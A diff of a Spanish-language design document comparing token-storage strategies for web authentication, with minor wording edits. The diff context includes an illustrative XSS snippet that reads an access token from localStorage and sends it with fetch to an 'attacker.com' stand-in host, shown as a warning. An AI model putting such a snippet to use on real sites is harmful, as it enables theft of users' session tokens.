@@ -61,7 +61,7 @@ La elección depende principalmente de:
 | | | | |
 | **📱 EXPERIENCIA DE USUARIO** | | | |
 | Transparencia de renovación | <span class="security-badge high">★★★★★</span><br/>Totalmente transparente | <span class="security-badge medium">★★★☆☆</span><br/>Puede requerir loader | **Estrategia 1** |
-| Persistencia entre tabs | <span class="security-badge high">★★★★★</span><br/>Compartido automáticamente | <span class="security-badge medium">★★★☆☆</span><br/>Depende de localStorage | **Estrategia 1** |
+| Persistencia entre tabs | <span class="security-badge high">★★★★★</span><br/>Compartido automáticamente | <span class="security-badge medium">★★★☆☆</span><br/>Manejo de data en memoria | **Estrategia 1** |
 | Logout sincronizado | <span class="security-badge high">★★★★☆</span><br/>Clear cookies global | <span class="security-badge medium">★★★☆☆</span><br/>Requiere BroadcastChannel | **Estrategia 1** |
 | Offline-first apps | <span class="security-badge low">★★☆☆☆</span><br/>Cookies expiran | <span class="security-badge medium">★★★☆☆</span><br/>AT puede validarse localmente | **Estrategia 2** |
 
@@ -241,7 +241,7 @@ La elección depende principalmente de:
 
 1. **Vulnerabilidad XSS Crítica**
    ```javascript
-   // ❌ Ataque XSS exitoso
+   // ❌ Ataque XSS exitoso ( en caso de manejarse en localstorage)
    <script>
      const token = localStorage.getItem('accessToken');
      fetch('https://attacker.com/steal', {
